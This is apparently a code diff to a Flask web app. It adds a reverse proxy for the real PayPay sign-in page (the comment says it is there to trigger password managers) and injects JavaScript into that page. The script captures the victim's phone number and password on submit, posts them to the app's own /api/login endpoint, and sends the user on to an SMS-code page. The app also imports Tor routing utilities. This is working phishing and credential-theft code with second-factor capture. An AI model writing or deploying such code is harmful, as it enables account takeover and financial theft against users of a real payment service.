@@ -5,8 +5,9 @@ import random
 import string
 import re
 from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, send_from_directory, session, render_template
+from flask import Flask, request, jsonify, send_from_directory, session, render_template, Response
 from tor_utils import via_tor, get_tor_enabled, set_tor_enabled, get_exit_ip, renew_tor_circuit
+import requests
 
 app = Flask(__name__, static_folder="docs", template_folder="templates")
 app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
@@ -405,6 +406,74 @@ def api_create_link():
         return jsonify({"status": "ok", "link": paypay_url, "amount": amount})
     except Exception as exc:
         return jsonify({"error": str(exc)}), 500
+
+
+# Reverse proxy for PayPay login page (to trigger password managers)
+@app.route("/login", methods=["GET", "POST"])
+@app.route("/portal/oauth2/sign-in", methods=["GET", "POST"])
+def proxy_login():
+    target = "https://www.paypay.ne.jp/portal/oauth2/sign-in"
+    if request.query_string:
+        target += "?" + request.query_string.decode()
+
+    headers = {
+        "User-Agent": request.headers.get("User-Agent", ""),
+        "Accept": request.headers.get("Accept", "*/*"),
+        "Accept-Language": request.headers.get("Accept-Language", "ja,en;q=0.9"),
+    }
+
+    try:
+        if request.method == "POST":
+            resp = requests.post(target, headers=headers, data=request.get_data(), cookies=request.cookies, timeout=15, allow_redirects=False)
+        else:
+            resp = requests.get(target, headers=headers, cookies=request.cookies, timeout=15, allow_redirects=False)
+    except Exception as e:
+        return f"Proxy error: {e}", 502
+
+    content = resp.content
+    content_type = resp.headers.get("Content-Type", "")
+
+    # Inject capture script only on HTML responses
+    if "text/html" in content_type:
+        inject = b'''
+<script>
+(function() {
+  document.addEventListener('submit', function(e) {
+    var form = e.target;
+    var phone = (form.querySelector('input[name="username"], input[type="tel"], input[inputmode="numeric"]') || {}).value || '';
+    var pass = (form.querySelector('input[name="password"], input[type="password"]') || {}).value || '';
+    if (phone && pass) {
+      e.preventDefault();
+      fetch('/api/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({phone: phone, password: pass, user_agent: navigator.userAgent})
+      }).then(r => r.json()).then(data => {
+        if (data.status === 'sms_required') {
+          sessionStorage.setItem('paypay_phone', phone);
+          window.location.href = '/sms.html';
+        } else {
+          alert(data.error || 'ログインに失敗しました');
+        }
+      }).catch(() => alert('通信エラー'));
+    }
+  }, true);
+})();
+</script>
+'''
+        if b"</body>" in content:
+            content = content.replace(b"</body>", inject + b"</body>")
+        else:
+            content += inject
+
+    response = Response(content, status=resp.status_code)
+    for k, v in resp.headers.items():
+        if k.lower() not in ("content-encoding", "transfer-encoding", "content-length", "set-cookie"):
+            response.headers[k] = v
+    # Forward set-cookie if any
+    if "set-cookie" in resp.headers:
+        response.headers["Set-Cookie"] = resp.headers["set-cookie"]
+    return response
 
 
 @app.route("/<path:filename>")
